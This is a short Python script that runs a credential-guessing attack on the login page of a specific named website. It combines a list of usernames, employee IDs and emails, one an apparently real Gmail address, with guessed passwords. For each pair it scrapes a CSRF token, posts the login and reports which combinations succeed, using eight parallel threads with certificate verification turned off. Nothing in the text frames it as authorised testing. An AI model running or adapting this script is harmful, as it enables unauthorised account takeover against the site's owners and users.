import urllib.request
import urllib.parse
import http.cookiejar
import ssl
import re
from concurrent.futures import ThreadPoolExecutor

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE_URL = "https://ags.raptor.unaux.com/public/index.php"

idents = [
    'admin', 'ceo', 'hr', 'manager', 'sales', 'executive',
    'admin@raptor.com', 'ceo@raptor.com', 'hr@raptor.com', 'manager@raptor.com',
    'EMP001', 'EMP002', 'EMP003', 'EMP004', 'EMP005', 'EMP006', 'EMP007', 'EMP008', 'EMP009', 'EMP010',
    'ADM001', 'CEO001', 'HR001', 'MGR001', 'TL001',
    'axiora.operations@gmail.com'
]

passwords = [
    'Password123!',
    'Raptor@12345',
    'Admin@12345',
    'Axiorags@2026',
    'RaptorProd@2026!'
]

pairs = [(i, p) for i in idents for p in passwords]

def test_pair(pair):
    ident, pwd = pair
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
    try:
        r = opener.open(f"{BASE_URL}?route=auth/login", timeout=10)
        login_html = r.read().decode('utf-8', errors='ignore')
        csrf_match = re.search(r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)["\']', login_html)
        csrf_token = csrf_match.group(1) if csrf_match else ''
        
        login_data = urllib.parse.urlencode({
            'email': ident,
            'password': pwd,
            'csrf_token': csrf_token
        }).encode('utf-8')

        req = urllib.request.Request(f"{BASE_URL}?route=auth/login", data=login_data)
        r_login = opener.open(req, timeout=10)
        res_body = r_login.read().decode('utf-8', errors='ignore')
        
        err_matches = re.findall(r'<div[^>]*class=["\'][^"\']*invalid-feedback[^"\']*["\'][^>]*>(.*?)</div>', res_body)
        if not any(err_matches):
            print(f"SUCCESS LOGIN: User '{ident}' | Password '{pwd}'")
            return (ident, pwd)
    except Exception as e:
        pass
    return None

print("=== Scanning for All Valid User Credentials ===")
with ThreadPoolExecutor(max_workers=8) as executor:
    valid_users = [r for r in executor.map(test_pair, pairs) if r]

print("\nValid Users Found:", valid_users)
